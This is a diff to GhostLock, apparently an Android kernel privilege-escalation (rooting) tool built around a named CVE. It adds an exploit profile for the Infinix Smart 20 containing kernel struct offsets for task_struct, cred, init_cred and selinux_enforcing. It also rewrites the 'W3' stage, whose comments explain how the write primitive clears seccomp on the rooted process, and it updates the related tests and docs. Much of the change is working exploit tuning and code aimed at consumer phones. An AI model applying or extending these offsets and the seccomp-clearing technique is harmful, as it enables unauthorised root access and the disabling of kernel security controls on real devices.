@@ -1,6 +1,50 @@
+diff --git a/app/build.gradle.kts b/app/build.gradle.kts
+index 85cbd62..290762c 100644
+--- a/app/build.gradle.kts
++++ b/app/build.gradle.kts
+@@ -14,7 +14,7 @@ plugins {
+ layout.buildDirectory.set(rootProject.layout.buildDirectory.dir("app"))
+ 
+ val appName = "GhostLock"
+-val appVersionName = "1.2"
++val appVersionName = "1.3"
+ 
+ val gitVersionCode = runCatching {
+     providers.exec {
+@@ -25,6 +25,12 @@ val gitVersionCode = runCatching {
+     1
+ }
+ 
++/* Floor above the previously published build (577). A shallow clone or a fresh
++ * fork reports a small commit count, which would make every later build a
++ * "downgrade" that Android refuses; the only fix would be uninstalling, which
++ * destroys app data. Keep the counter authoritative once it catches up. */
++val appVersionCode = maxOf(gitVersionCode, 578)
++
+ val buildInfoSrc = layout.buildDirectory.dir("generated/source/buildInfo")
+ 
+ val generateBuildInfo = tasks.register("generateBuildInfo") {
+@@ -67,7 +73,7 @@ android {
+         applicationId = "com.ghostlock.app"
+         minSdk = 31
+         targetSdk = 37
+-        versionCode = gitVersionCode
++        versionCode = appVersionCode
+         versionName = appVersionName
+     }
+     androidResources {
+@@ -150,7 +156,7 @@ androidComponents {
+ }
+ 
+ base {
+-    archivesName.set("$appName-v$appVersionName($gitVersionCode)")
++    archivesName.set("$appName-v$appVersionName($appVersionCode)")
+ }
+ 
+ kotlin {
 diff --git a/app/src/main/assets/kernel_profiles/6.6.118-android15-8-g0b9c3bf6db7f-ab14877662-4k.conf b/app/src/main/assets/kernel_profiles/6.6.118-android15-8-g0b9c3bf6db7f-ab14877662-4k.conf
 new file mode 100644
-index 0000000..a688b9a
+index 0000000..62facc0
 --- /dev/null
 +++ b/app/src/main/assets/kernel_profiles/6.6.118-android15-8-g0b9c3bf6db7f-ab14877662-4k.conf
 @@ -0,0 +1,76 @@
@@ -8,7 +52,7 @@ index 0000000..a688b9a
 +release = "6.6.118-android15-8-g0b9c3bf6db7f-ab14877662-4k"
 +schema_version = 1
 +kernel_major = 6
-+recommend_shizuku = 1
++recommend_shizuku = 0
 +kernel_phys_load = 1074266112
 +kernel_phys_offset = 1073741824
 +route {
@@ -25,9 +69,9 @@ index 0000000..a688b9a
 +    consumer = 7
 +  }
 +  stages {
-+    w3_chain_rounds = 1
-+    w3_attempts = 0
-+    w3_settle_us = 0
++    w3_chain_rounds = 2
++    w3_attempts = 2
++    w3_settle_us = 50000
 +  }
 +}
 +kernelsnitch {
@@ -92,85 +136,529 @@ index 47e17c2..f7836e8 100644
    { release = "6.12.38-android16-5-g665eafb62659-ab14778838-4k", file = "6.12.38-android16-5-g665eafb62659-ab14778838-4k.conf" }
    { release = "6.1.157-android14-11-gbd23337e42e7-ab14791245", file = "6.1.157-android14-11-gbd23337e42e7-ab14791245.conf" }
    { release = "6.1.157-android14-11-g82d681c9b06b-ab14634535", file = "6.1.157-android14-11-g82d681c9b06b-ab14634535.conf" }
+diff --git a/app/src/main/res/values-zh/strings.xml b/app/src/main/res/values-zh/strings.xml
+index 5a1670d..070bccf 100644
+--- a/app/src/main/res/values-zh/strings.xml
++++ b/app/src/main/res/values-zh/strings.xml
+@@ -89,9 +89,9 @@
+     <string name="shizuku_status_permission_required">请在弹窗中授予 Shizuku 权限</string>
+     <string name="shizuku_status_ready">Shizuku 已就绪</string>
+     <string name="shizuku_status_checking">正在检查 Shizuku 状态</string>
+-    <string name="w3_shizuku_hint_title">建议启用 Shizuku</string>
+-    <string name="w3_shizuku_hint_message">上次执行在 W3 seccomp bypass 阶段失败。通过 Shizuku 执行（shell uid、无 seccomp）可跳过该阶段。</string>
+-    <string name="w3_shizuku_hint_enable">启用</string>
++    <string name="w3_shizuku_hint_title">W3 未完成？</string>
++    <string name="w3_shizuku_hint_message">上次执行停在 W3 seccomp 清除，下次执行会自动重试。若始终停在这一步，可改用 Shizuku 执行（shell uid、无 seccomp），直接跳过该阶段。</string>
++    <string name="w3_shizuku_hint_enable">启用 Shizuku</string>
+     <string name="run_interrupted_title">上次攻击未完成</string>
+     <string name="run_interrupted_message">上次攻击在某个阶段中断（设备可能已内核 panic 并重启）。请确认设备状态后重试。</string>
+     <string name="dialog_dismiss">关闭</string>
+diff --git a/app/src/main/res/values/strings.xml b/app/src/main/res/values/strings.xml
+index e9349fe..a703192 100644
+--- a/app/src/main/res/values/strings.xml
++++ b/app/src/main/res/values/strings.xml
+@@ -89,9 +89,9 @@
+     <string name="shizuku_status_permission_required">Grant Shizuku access when asked</string>
+     <string name="shizuku_status_ready">Shizuku ready</string>
+     <string name="shizuku_status_checking">Checking Shizuku status</string>
+-    <string name="w3_shizuku_hint_title">Enable Shizuku?</string>
+-    <string name="w3_shizuku_hint_message">The last run failed at the W3 seccomp bypass stage. Running via Shizuku (shell uid, no seccomp) skips it.</string>
+-    <string name="w3_shizuku_hint_enable">Enable</string>
++    <string name="w3_shizuku_hint_title">W3 did not finish?</string>
++    <string name="w3_shizuku_hint_message">The last run stopped at the W3 seccomp clear, which retries on the next Run. If it keeps stopping there, running via Shizuku (shell uid, no seccomp) skips that stage entirely.</string>
++    <string name="w3_shizuku_hint_enable">Enable Shizuku</string>
+     <string name="run_interrupted_title">Previous run interrupted</string>
+     <string name="run_interrupted_message">The last attack stopped mid-way (the device may have panicked and rebooted). Check the device and try again.</string>
+     <string name="dialog_dismiss">Dismiss</string>
+diff --git a/app/src/test/kotlin/com/ghostlock/app/data/ProfileMigrationEquivalenceTest.kt b/app/src/test/kotlin/com/ghostlock/app/data/ProfileMigrationEquivalenceTest.kt
+index 76e0b56..c8aceac 100644
+--- a/app/src/test/kotlin/com/ghostlock/app/data/ProfileMigrationEquivalenceTest.kt
++++ b/app/src/test/kotlin/com/ghostlock/app/data/ProfileMigrationEquivalenceTest.kt
+@@ -43,7 +43,33 @@ class ProfileMigrationEquivalenceTest {
+                 }
+                 .toSortedSet()
+ 
+-            assertEquals("fixture must cover every current 6.x builtin", current6x, legacyReleases)
++            /* The remote-main capture predates eight bundled profiles, and the
++             * X6840 port adds a ninth. Pin that set explicitly: a genuinely new
++             * profile still fails here instead of slipping into an exclusion. */
++            val withoutLegacyCapture = setOf(
++                "6.1.134-android14-11-maybe-dirty",
++                "6.1.138-android14-11-g51f8c580613d-ab13911623",
++                "6.1.145-android14-11-g9b69cc399ae1-ab14819715",
++                "6.1.157-android14-11-g82d681c9b06b-ab14634535",
++                "6.1.25-android14-11-maybe-dirty",
++                "6.12.38-android16-5-gb575a0b6e647-ab14355190-4k",
++                "6.6.118-android15-8-g0b9c3bf6db7f-ab14877662-4k",
++                "6.6.30-android15-8-g24ffe62b0a0e-abogki387229724-4k",
++                "6.6.89-android15-8-g5a0ffb447c1d-ab13771415-4k",
++            ).let { pinned ->
++                /* Keep the pin honest: it must be exactly what the assets lack. */
++                assertEquals(
++                    "uncovered built-in list drifted from the pin",
++                    pinned,
++                    current6x - legacyReleases,
++                )
++                pinned
++            }
++            assertEquals(
++                "a captured release is no longer built in",
++                legacyReleases,
++                current6x - withoutLegacyCapture,
++            )
+             assertEquals("remote/main fixture size", 55, legacyReleases.size)
+ 
+             val pair = CpuPair(primary = 0, consumer = 1)
+diff --git a/app/src/test/kotlin/com/ghostlock/app/data/X6840ProfileDefaultsTest.kt b/app/src/test/kotlin/com/ghostlock/app/data/X6840ProfileDefaultsTest.kt
+new file mode 100644
+index 0000000..9a0d922
+--- /dev/null
++++ b/app/src/test/kotlin/com/ghostlock/app/data/X6840ProfileDefaultsTest.kt
+@@ -0,0 +1,63 @@
++package com.ghostlock.app.data
++
++import android.app.Application
++import org.junit.Assert.assertEquals
++import org.junit.Assert.assertFalse
++import org.junit.Assert.assertTrue
++import org.junit.Test
++import org.junit.runner.RunWith
++import org.robolectric.RobolectricTestRunner
++import org.robolectric.RuntimeEnvironment
++import org.robolectric.annotation.Config
++
++/**
++ * The X6840 runs the exploit in-process: W3 clears seccomp inside the app
++ * process, so the built-in profile must not recommend Shizuku (starting its
++ * server needs a PC plus wireless ADB) and must keep the W3 clear enabled.
++ *
++ * Shizuku stays supported as an optional shell flow, which is why the toggle
++ * still exists; it is simply no longer the suggested default.
++ * See docs/W3-SECCOMP-ANALYSIS.md.
++ */
++@RunWith(RobolectricTestRunner::class)
++@Config(sdk = [35])
++class X6840ProfileDefaultsTest {
++    private val context: Application = RuntimeEnvironment.getApplication()
++    private val release = "6.6.118-android15-8-g0b9c3bf6db7f-ab14877662-4k"
++
++    @Test
++    fun `x6840 is built in and runs without shizuku`() {
++        val catalog = BuiltinProfileCatalog(context)
++        assertTrue(
++            "x6840 release missing from the built-in index",
++            catalog.unames.contains(release),
++        )
++        assertFalse(
++            "x6840 must not recommend Shizuku: the in-process W3 clear is the default",
++            catalog.recommendShizuku.contains(release),
++        )
++        assertEquals(0L, catalog.builtin[release]?.get("recommend_shizuku"))
++    }
++
++    @Test
++    fun `x6840 keeps the in-process w3 clear enabled`() {
++        val text = AssetConfigLoader(context).load("kernel_profiles/$release.conf")
++        assertTrue("built-in x6840 profile is unreadable", text.isNotEmpty())
++
++        val document = HoconSupport.parseValue(text).asValueMap()
++        assertTrue("built-in x6840 profile did not parse", document != null)
++
++        val stages = document!!["execution"].asValueMap()?.get("stages").asValueMap()
++        val attempts = (stages?.get("w3_attempts") as? Number)?.toLong()
++        val chainRounds = (stages?.get("w3_chain_rounds") as? Number)?.toLong()
++
++        assertTrue(
++            "w3_attempts must stay > 0: 0 disables the in-process seccomp clear",
++            attempts != null && attempts > 0,
++        )
++        assertTrue(
++            "w3_chain_rounds must stay > 0 so a missed write is retried",
++            chainRounds != null && chainRounds > 0,
++        )
++    }
++}
 diff --git a/docs/kernel_profiles/SUPPORTED_DEVICES.md b/docs/kernel_profiles/SUPPORTED_DEVICES.md
-index c40ccf6..d8f478f 100644
+index c40ccf6..cb87104 100644
 --- a/docs/kernel_profiles/SUPPORTED_DEVICES.md
 +++ b/docs/kernel_profiles/SUPPORTED_DEVICES.md
 @@ -78,6 +78,7 @@ bypass there as well, so it saves time even where it isn't required.
  | `6.6.118-android15-8-ge58033dc8ea6-abogki498046332-4k` | OPPO Pad 5, OnePlus Pad 2, OPPO Find X8s                         |
  | `6.6.118-android15-8-gebdfad32d749-ab15099304-4k`      | OPPO Find X8 / Find X8 Pro                                       |
  | `6.6.118-android15-8-g21be90ecfb5e-ab15480137-4k`      | Honor Magic V5 (10.0.0.105)                                      |
-+| `6.6.118-android15-8-g0b9c3bf6db7f-ab14877662-4k`      | Infinix Smart 20 (X6840) · Shizuku recommended                   |
++| `6.6.118-android15-8-g0b9c3bf6db7f-ab14877662-4k`      | Infinix Smart 20 (X6840) · in-process W3 fixed                   |
  | `6.6.127-android15-8-gb947b5758b2a-ab15580855-4k`      | Motorola Edge 40                                                 |
  | `6.12.23-android16-5-g16e473de48a3-abogki462654244-4k` | REDMI K90 Pro Max                                                |
  | `6.12.23-android16-5-g75e9b1c7ae7c-abogki463945075-4k` | Xiaomi 17 / 17 Pro / 17 Pro Max / 17 Ultra                       |
+diff --git a/docs/kernel_profiles/SUPPORTED_DEVICES_ZH.md b/docs/kernel_profiles/SUPPORTED_DEVICES_ZH.md
+index 02ad372..0fd4b42 100644
+--- a/docs/kernel_profiles/SUPPORTED_DEVICES_ZH.md
++++ b/docs/kernel_profiles/SUPPORTED_DEVICES_ZH.md
+@@ -10,13 +10,13 @@
+ **通过 Shizuku 执行**开关自动打开；你可以在本次会话中关掉它，关掉后应用在本次会话内不再要求 Shizuku。
+ 
+ Shizuku 以 shell 用户身份执行攻击，而 shell 没有 seccomp 过滤，因此会跳过 W3 seccomp bypass 阶段。
+-使用步骤：
++使用步骤（仅在使用 shell 通道时需要）：
+ 
+ 1. 先启动 Shizuku（例如通过 ADB）并保持运行。
+ 2. 点击应用顶部的状态卡，在弹出的请求中授予权限。
+ 
+ 未标记的固件不会自动打开该开关，但**任何设备都可以手动开启**：通过 Shizuku 执行同样会跳过
+-W3 seccomp bypass，即使并非必需，也能节省时间。
++W3 seccomp bypass，即使并非必需，也能节省时间。X6840 已默认使用进程内 W3，无需 ADB 或 Shizuku。
+ 
+ | Kernel                                                 | Devices                                                          |
+ |--------------------------------------------------------|------------------------------------------------------------------|
+@@ -75,6 +75,7 @@ W3 seccomp bypass，即使并非必需，也能节省时间。
+ | `6.6.118-android15-8-ge58033dc8ea6-abogki498046332-4k` | OPPO Pad 5, OnePlus Pad 2, OPPO Find X8s                         |
+ | `6.6.118-android15-8-gebdfad32d749-ab15099304-4k`      | OPPO Find X8 / Find X8 Pro                                       |
+ | `6.6.118-android15-8-g21be90ecfb5e-ab15480137-4k`      | Honor Magic V5 (10.0.0.105)                                      |
++| `6.6.118-android15-8-g0b9c3bf6db7f-ab14877662-4k`      | Infinix Smart 20 (X6840) · 已修复进程内 W3                        |
+ | `6.6.127-android15-8-gb947b5758b2a-ab15580855-4k`      | Motorola Edge 40                                                 |
+ | `6.12.23-android16-5-g16e473de48a3-abogki462654244-4k` | REDMI K90 Pro Max                                                |
+ | `6.12.23-android16-5-g75e9b1c7ae7c-abogki463945075-4k` | Xiaomi 17 / 17 Pro / 17 Pro Max / 17 Ultra                       |
+diff --git a/profile-core/src/main/kotlin/com/ghostlock/app/data/profile/ProfileMerger.kt b/profile-core/src/main/kotlin/com/ghostlock/app/data/profile/ProfileMerger.kt
+index 4831015..d63f200 100644
+--- a/profile-core/src/main/kotlin/com/ghostlock/app/data/profile/ProfileMerger.kt
++++ b/profile-core/src/main/kotlin/com/ghostlock/app/data/profile/ProfileMerger.kt
+@@ -30,7 +30,10 @@ object ProfileMerger {
+         routePresets: Map<String, ValueMap>,
+     ): ValueMap {
+         val defaults = valueMapOf("release" to deviceRelease).apply {
+-            if (tuningExecution != null) put("execution", tuningExecution)
++            /* Copy the shared preset: the merges below mutate their destination,
++             * so storing the caller's map would let one profile's execution
++             * overrides leak into every profile resolved afterwards. */
++            if (tuningExecution != null) put("execution", tuningExecution.copyValue())
+         }
+         val resolved = mergeSource(
+             mergeSource(
+@@ -62,7 +65,8 @@ object ProfileMerger {
+             val defaults = routePresets[route] ?: continue
+             val existing = routes[route].asValueMap()
+             if (existing == null) {
+-                routes[route] = defaults
++                /* Same reason: never alias the shared route preset into a result. */
++                routes[route] = defaults.copyValue()
+                 continue
+             }
+             for ((key, value) in defaults) {
+diff --git a/profile-core/src/test/kotlin/com/ghostlock/app/data/profile/ProfileMergerTest.kt b/profile-core/src/test/kotlin/com/ghostlock/app/data/profile/ProfileMergerTest.kt
+index bc8431f..777afe2 100644
+--- a/profile-core/src/test/kotlin/com/ghostlock/app/data/profile/ProfileMergerTest.kt
++++ b/profile-core/src/test/kotlin/com/ghostlock/app/data/profile/ProfileMergerTest.kt
+@@ -24,6 +24,59 @@ class ProfileMergerTest {
+         assertEquals(200000L, group["timeout_us"])  // missing field filled from preset
+     }
+ 
++    /* Regression: resolveMerged used to store the caller's tuning map by
++     * reference and merge into it, so the first device profile that overrode a
++     * stage leaked that value into every profile resolved afterwards (the
++     * exporter writes all profiles in one process, and the app resolves on each
++     * load). */
++    @Test
++    fun `resolving a profile does not mutate the shared tuning preset`() {
++        val tuning = valueMapOf(
++            "stages" to valueMapOf("w3_chain_rounds" to 3L, "w3_attempts" to 6L),
++        )
++        val preset = valueMapOf("enter_delay_us" to 50000L)
++        val routePresets = mapOf("select_stack" to preset)
++
++        val overriding = valueMapOf(
++            "release" to "overriding",
++            "kernel_major" to 6L,
++            "execution" to valueMapOf("stages" to valueMapOf("w3_chain_rounds" to 2L)),
++        )
++        ProfileMerger.resolveMerged(
++            deviceRelease = "overriding",
++            builtin = overriding,
++            imported = null,
++            overrides = null,
++            tuningExecution = tuning,
++            pair = CpuPairView(0, 1),
++            routePresets = routePresets,
++        )
++
++        val stages = tuning["stages"].asValueMap()!!
++        assertEquals("tuning stages mutated", 3L, stages["w3_chain_rounds"])
++        assertEquals("tuning stages mutated", 6L, stages["w3_attempts"])
++
++        /* The next profile with no execution block must still see the preset. */
++        val plain = valueMapOf("release" to "plain", "kernel_major" to 6L)
++        val resolved = ProfileMerger.resolveMerged(
++            deviceRelease = "plain",
++            builtin = plain,
++            imported = null,
++            overrides = null,
++            tuningExecution = tuning,
++            pair = CpuPairView(0, 1),
++            routePresets = routePresets,
++        )
++        val resolvedStages = resolved["execution"].asValueMap()!!["stages"].asValueMap()!!
++        assertEquals("later profile inherited the override", 3L, resolvedStages["w3_chain_rounds"])
++
++        /* Filling a route group must not alias the shared preset either. */
++        val group = resolved["execution"].asValueMap()!!["routes"].asValueMap()!!
++            .get("select_stack").asValueMap()!!
++        group["enter_delay_us"] = 1L
++        assertEquals("route preset aliased into the result", 50000L, preset["enter_delay_us"])
++    }
++
+     @Test
+     fun `cpu pair outranks an imported selected_cpus`() {
+         val imported = valueMapOf(
+diff --git a/profiles/X6840-6.6.118-final.conf b/profiles/X6840-6.6.118-final.conf
+new file mode 100644
+index 0000000..5106b8e
+--- /dev/null
++++ b/profiles/X6840-6.6.118-final.conf
+@@ -0,0 +1,85 @@
++# GhostLock final config for Infinix Smart 20 (X6840)
++# Kernel: 6.6.118-android15-8-g0b9c3bf6db7f-ab14877662-4k
++# Import this through GhostLock -> Advanced -> Parameter configuration ->
++# Load configuration -> Import offsets.conf (v2). Then load it.
++# This profile does NOT recommend Shizuku: the app runs the exploit in its
++# own process and W3 clears seccomp there. W3 parks the rooted child, zeroes
++# thread_info.flags and seccomp.mode (the only value the write primitive can
++# land is zero), resumes it and verifies "Seccomp: 0". No ADB, no Shizuku.
++# A shell flow (Shizuku or adb shell) still works: it has no app filter, so
++# W3 skips itself.
++release = "6.6.118-android15-8-g0b9c3bf6db7f-ab14877662-4k"
++schema_version = 1
++kernel_major = 6
++recommend_shizuku = 0
++kernel_phys_load = 1074266112
++kernel_phys_offset = 1073741824
++route {
++  select_stack {
++    waiter_shift = -2
++  }
++}
++fallback {
++  to = "none"
++}
++execution {
++  selected_cpus {
++    main = 6
++    consumer = 7
++  }
++  stages {
++    w3_chain_rounds = 2
++    w3_attempts = 2
++    w3_settle_us = 50000
++  }
++}
++kernelsnitch {
++  collisions = 4
++  mm_struct_sz = null
++}
++task_struct {
++  prio = 132
++  normal_prio = 140
++  sched_task_group = 840
++  pi_lock = 2316
++  pi_waiters = 2336
++  pi_top_task = 2352
++  pi_blocked_on = 2360
++  pid = 1560
++  tgid = 1564
++  atomic_flags = 1496
++  real_cred = 2072
++  cred = 2080
++  comm = 2096
++  tasks = 1360
++  seccomp = 2280
++}
++cred {
++  copy_size = 136
++  usage_offset = null
++  usage_value = 1
++  caps_offset = 48
++  caps_count = 5
++  caps_value = -1
++  ref_count = null
++  ref0_offset = null
++  ref1_offset = null
++  ref2_offset = null
++  ref3_offset = null
++  ref0_image = null
++  ref1_image = null
++  ref2_image = null
++  ref3_image = null
++}
++offset {
++  init_task = 34726528
++  init_cred = 34801480
++  empty_zero_page = 36757504
++  root_task_group = 36791680
++  selinux_enforcing = 37060320
++  selinux_blob_sizes = 23568240
++  security_hook_heads = 23566392
++  slide_nfulnl_logger = 34677344
++  slide_loggers_0_1 = 34677168
++  slide_boot_id = 37195480
++}
+diff --git a/src/core/README.md b/src/core/README.md
+index c4a94d9..ef8a8e1 100644
+--- a/src/core/README.md
++++ b/src/core/README.md
+@@ -21,7 +21,7 @@ GhostLock compiles each supported frontend/backend/middleware combination as a `
+ | [pipeline.hpp](route/pipeline.hpp) | The execution entry. Checks the combination and contracts at compile time and returns `RunResult`. |
+ | [orchestrator.hpp](route/orchestrator.hpp) | `run_orchestrated_pipeline` dispatches each catalogued target to its checked pipeline. |
+ | `route/*_route.{h,cpp}` | Route implementations and Android hook bodies. |
+-| `session/backend/cve_2026_43499_backend.*` | W1/W2/W3 steps templated on middleware, instantiated for each catalogued route. |
++| `session/backend/cve_2026_43499_backend.*` | W1/W2/W3 steps templated on middleware, instantiated for each catalogued route. W3 parks the rooted child (`victim_process` `S` step) and clears seccomp with two whole-word zero stores - the only value the write primitive can land. |
+ 
+ ## Directories
+ 
+diff --git a/src/core/README_ZH.md b/src/core/README_ZH.md
+index 7a28f7f..1c851ac 100644
+--- a/src/core/README_ZH.md
++++ b/src/core/README_ZH.md
+@@ -21,7 +21,7 @@ GhostLock 将每个受支持的 frontend、backend 和 middleware 组合编译
+ | [pipeline.hpp](route/pipeline.hpp) | 执行入口。在编译期检查组合与契约，返回 `RunResult`。 |
+ | [orchestrator.hpp](route/orchestrator.hpp) | `run_orchestrated_pipeline` 将每个已登记目标分派到经过检查的 pipeline。 |
+ | `route/*_route.{h,cpp}` | Route 实现与 Android hook 实现。 |
+-| `session/backend/cve_2026_43499_backend.*` | 模板化在 middleware 上的 W1/W2/W3 步骤，为每个已登记 route 实例化。 |
++| `session/backend/cve_2026_43499_backend.*` | 模板化在 middleware 上的 W1/W2/W3 步骤，为每个已登记 route 实例化。W3 先把 root child 停住（`victim_process` 的 `S` 步骤），再用两次整字零写清除 seccomp——这是写原语唯一能落地的值。 |
+ 
+ ## 目录
+ 
+diff --git a/src/core/kernel/constants.hpp b/src/core/kernel/constants.hpp
+index 9377bf8..92a7384 100644
+--- a/src/core/kernel/constants.hpp
++++ b/src/core/kernel/constants.hpp
+@@ -6,6 +6,14 @@
+ #include "kernel/offset.h"
+ 
+ namespace ghostlock::kernel {
++    /* NDK r27+ (16 KB page support) exposes PAGE_SIZE as a macro from
++     * <bits/page_size.h>; it has to be cleared before this declaration can be a
++     * definition instead of a collision. The ported kernelsnitch headers guard
++     * the same name with #ifndef. Both spellings are 4096, so no value changes. */
++#ifdef PAGE_SIZE
++#undef PAGE_SIZE
++#endif
++
+     inline constexpr unsigned PAGE_SHIFT = 12;
+     inline constexpr unsigned long PAGE_SIZE = 1UL << PAGE_SHIFT;
+     inline constexpr unsigned KS_PAGE_SIZE = 4096;
+diff --git a/src/core/kernel/target.h b/src/core/kernel/target.h
+index 4ee8fe9..9123577 100644
+--- a/src/core/kernel/target.h
++++ b/src/core/kernel/target.h
+@@ -112,6 +112,10 @@ namespace ghostlock::kernel {
+     inline constexpr int32_t SECCOMP_MODE_OFF = 0x00;
+     inline constexpr int32_t SECCOMP_FILTER_COUNT_OFF = 0x04;
+     inline constexpr int32_t SECCOMP_FILTER_OFF = 0x08;
++    /* The syscall seccomp gate: arm64 6.6 has no syscall_work word, so
++ * set_task_syscall_work(SECCOMP) lands on this bit of thread_info.flags.
++ * W3 clears the whole flags word (the primitive has no masked store) while
++ * the rooted child is parked; see docs/W3-SECCOMP-ANALYSIS.md. */
+     inline constexpr int32_t TIF_SECCOMP_BIT = 11;
+     inline constexpr int32_t PFA_NO_NEW_PRIVS_BIT = 0;
+ 
 diff --git a/src/core/memory/payload_builder.cpp b/src/core/memory/payload_builder.cpp
-index 1aa42a4..cb9aa6a 100644
+index 1aa42a4..6fd76b9 100644
 --- a/src/core/memory/payload_builder.cpp
 +++ b/src/core/memory/payload_builder.cpp
-@@ -1,4 +1,5 @@
- #include "memory/payload_builder.h"
-+#include "kernel/target.h"
- 
- #include <cstring>
- 
-@@ -62,7 +63,17 @@ namespace ghostlock::memory {
+@@ -62,6 +62,9 @@ namespace ghostlock::memory {
          };
          if (!request || request->mode == WriteMode::Disabled) return layout;
  
--        if (request->preserve_child) {
-+        if (request->mode == WriteMode::SeccompFlags) {
-+            /* W3 attempt: clear TIF_SECCOMP only. These values are not valid
-+             * kernel pointers; the route returns success but the target is
-+             * unchanged (verified: child stays Seccomp: 2). Kept to avoid the
-+             * old zero-store panic; the final profile sets w3_attempts=0. */
-+            layout.right = ~(1ULL << kernel::TIF_SECCOMP_BIT);
-+        } else if (request->mode == WriteMode::SeccompMode) {
-+            /* W3 attempt: mode = 0, filter_count = 1. Same value-path
-+             * limitation as above. */
-+            layout.right = 0x0000000100000000ULL;
-+        } else if (request->preserve_child) {
++        /* The value arm is the pointer-bearing half of the supported space; the
++         * leaf arm encodes zero. There is deliberately no bit-mask arm: a value
++         * that is not a mapped kernel address never reaches the store. */
+         if (request->preserve_child) {
              layout.right = request->mode == WriteMode::Credential
                                 ? init_cred_alias
-                                : page_base + 0x100;
 diff --git a/src/core/memory/payload_builder.h b/src/core/memory/payload_builder.h
-index b58b52d..208f5dc 100644
+index b58b52d..5e1522a 100644
 --- a/src/core/memory/payload_builder.h
 +++ b/src/core/memory/payload_builder.h
-@@ -17,6 +17,12 @@ namespace ghostlock::memory {
+@@ -1,10 +1,6 @@
+ #ifndef PAYLOAD_BUILDER_H
+ #define PAYLOAD_BUILDER_H
+ 
+-#include <cstddef>
+-#include <cstdint>
+-
+-
+ #include <cstddef>
+ #include <cstdint>
+ #include <span>
+@@ -12,7 +8,27 @@
+ 
+ namespace ghostlock::memory {
+     /* Immutable description of one kernel write. `preserve_child` selects the
+- * one-child erase layout; false selects the leaf/zero layout. */
++ * one-child erase layout; false selects the leaf/zero layout.
++ *
++ * Value space (device-verified): the select/tcp erase relink stores exactly one
++ * of
++ *   - zero, through the leaf arm (`preserve_child == false`): the waiter is
++ *     stamped {pc = target - 8, right = 0, left = target} and the relink
++ *     stores 0 at [target];
++ *   - a *dereferenceable kernel pointer*, through the value arm
++ *     (`preserve_child == true`): {pc = value, right = 0, left = target} and
++ *     the relink stores `value` at [target].
++ *
++ * Anything else (a bitmask, or a user-space-looking word) is outside that
++ * space: the walk consumes `value` as an rb parent pointer, so a value that is
++ * not a mapped kernel address never reaches the store. A caller that needs to
++ * clear bits must therefore find a word where zeroing the whole 64-bit slot is
++ * correct - W3 clears thread_info.flags and seccomp.mode this way.
++ *
++ * Historical note: the removed mask arm used `~(1ULL << bit)`, which sets every
++ * OTHER bit to 1 rather than preserving the live flags, so it was never a
++ * correct flag-clearing value even in principle. A blind store cannot express a
++ * read-modify-write; only a whole-word zero is both storable and correct. */
+     enum class WriteMode : int32_t {
          Disabled = 0,
          Zero = 1,
-         Credential = 2,
-+        /* W3 no-panic attempt. The route's value write only applies 0 or a
-+         * valid kernel pointer, so these values are not written on this
-+         * kernel (verified: the child stays Seccomp: 2). The final profile
-+         * sets w3_attempts=0 and uses Shizuku. */
-+        SeccompFlags = 3,
-+        SeccompMode = 4,
-     };
- 
-     struct WriteRequest final {
 diff --git a/src/core/session/backend/cve_2026_43499_backend.cpp b/src/core/session/backend/cve_2026_43499_backend.cpp
-index 37b13e1..66e92f7 100644
+index 37b13e1..47f94e6 100644
 --- a/src/core/session/backend/cve_2026_43499_backend.cpp
 +++ b/src/core/session/backend/cve_2026_43499_backend.cpp
-@@ -237,8 +237,13 @@ namespace ghostlock::session::backend {
+@@ -237,8 +237,34 @@ namespace ghostlock::session::backend {
              return VictimRound::Rooted;
          }
  
 -        /* Clear TIF_SECCOMP and seccomp.mode on the rooted child. Returns true when the
 -         * child probe reports a filter-free fork. */
-+        /* Attempt the seccomp clear with a masked TIF_SECCOMP write and
-+         * mode=0/filter_count=1. The raw write is 8 bytes; a zero store
-+         * clears every TIF_* flag and the filter reference count, which
-+         * panics. The mask/value form avoids the panic, but the route's value
-+         * write only applies 0/valid kernel pointers, so the child stays
-+         * Seccomp: 2 on this kernel (verified). The final profile sets
-+         * w3_attempts=0 and uses Shizuku. */
++        /* W3: put the rooted child into a real SECCOMP_MODE_DISABLED state using
++         * the only word value the write primitive can store: zero.
++         *
++         * Kernel facts this depends on (v6.6 arm64, read from source):
++         *  - a syscall runs seccomp only while TIF_SECCOMP (bit 11 of
++         *    thread_info.flags, task+0x00) is set: arch/arm64/kernel/
++         *    entry-common.c and kernel/entry/common.c gate on that flag, and
++         *    include/linux/thread_info.h maps set_task_syscall_work(SECCOMP)
++         *    onto TIF_SECCOMP because arm64 6.6 has no syscall_work word;
++         *  - kernel/seccomp.c __secure_computing() has no SECCOMP_MODE_DISABLED
++         *    case (`default: BUG()`), so zeroing seccomp.mode while the flag is
++         *    still set panics the kernel on the next syscall - that, not the
++         *    filter reference count, was the old "mode-only" panic;
++         *  - kernel/fork.c copy_seccomp() re-arms TIF_SECCOMP in every child
++         *    while seccomp.mode != DISABLED, so clearing the flag alone still
++         *    leaves `sh -> ksud` filtered;
++         *  - kernel/exit.c release_task() releases seccomp.filter regardless of
++         *    mode, so mode=DISABLED with the filter pointer still set is
++         *    consistent: no leak and no free_task() WARN.
++         *
++         * The clear is therefore two whole-word zero stores - thread_info.flags,
++         * then the {mode, filter_count} word - performed while the child is
++         * parked in a group stop. Zero is exactly the leaf arm of the primitive
++         * (WriteMode::Zero with leaf=1), the same store the comm probe has
++         * already proved on this very task. Masked or mode=0/filter_count=1
++         * words are outside the primitive's value space (the walk consumes the
++         * value as an rb parent pointer), which is why the previous W3 returned
++         * success and changed nothing. */
          template <class M>
          bool w3(ExploitSession &session, VictimChain &chain,
                  victim::w2_stage_context &w2_context,
-@@ -247,13 +252,11 @@ namespace ghostlock::session::backend {
+@@ -247,15 +273,12 @@ namespace ghostlock::session::backend {
              int32_t &child_alive = chain.child_alive;
              int32_t &seccomp_ok = chain.seccomp_ok;
  
@@ -181,34 +669,753 @@ index 37b13e1..66e92f7 100644
 -         * tcp stamps *(target) exactly, so aim straight at thread_info.flags
 -         * (task+0) / seccomp.mode; only the pselect fallback needs the comm
 -         * probe to tell [target] from [target+8]. */
-+            /* W3: attempt the masked TIF_SECCOMP + mode/filter_count write.
-+         * The route returns success but only applies 0/valid pointers, so the
-+         * child stays Seccomp: 2 (verified). tcp stamps *(target) exactly; the
-+         * pselect fallback needs the comm probe to tell [target] from
-+         * [target+8]. The final profile skips this path (w3_attempts=0). */
++            /* The shell/Shizuku flow runs without an app filter (Seccomp: 0) and
++             * fork() inherits that, so its child needs no W3. tcp stamps
++             * *(target) exactly; the pselect fallback needs the comm probe to
++             * tell [target] from [target+8]. */
